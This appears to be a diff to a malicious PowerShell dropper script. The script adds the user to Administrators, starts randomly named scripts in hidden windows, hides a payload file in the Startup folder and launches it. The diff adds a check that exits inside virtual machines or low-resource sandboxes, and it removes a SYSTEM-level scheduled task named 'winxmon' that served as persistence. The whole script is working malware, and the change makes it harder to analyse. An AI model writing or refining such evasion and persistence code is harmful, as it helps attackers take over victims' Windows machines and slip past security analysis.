@@ -14,6 +14,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Add-LocalGroupMember -Member $username -Group "Administrators"
 }
 
+### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
+if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
+    (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
+    (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
+    exit
+}
+
 Set-Variable -Name wd -Value (random_text)
 Set-Variable -Value ("$env:temp\$wd") -Name path
 Set-Variable -Name INITIALPATH -Value (Get-Location)
@@ -118,14 +125,6 @@ Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwj
 #Start-Process -FilePath "$initial_dir\edpnotify.ps1" -windowstyle hidden
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"
-
-$TaskName = "winxmon"
-$TaskPath = "C:\Windows\System32\Tasks\$TaskName"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AEQKCPrkuifY.ps1"
-$Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
-$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
 
 Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden
 
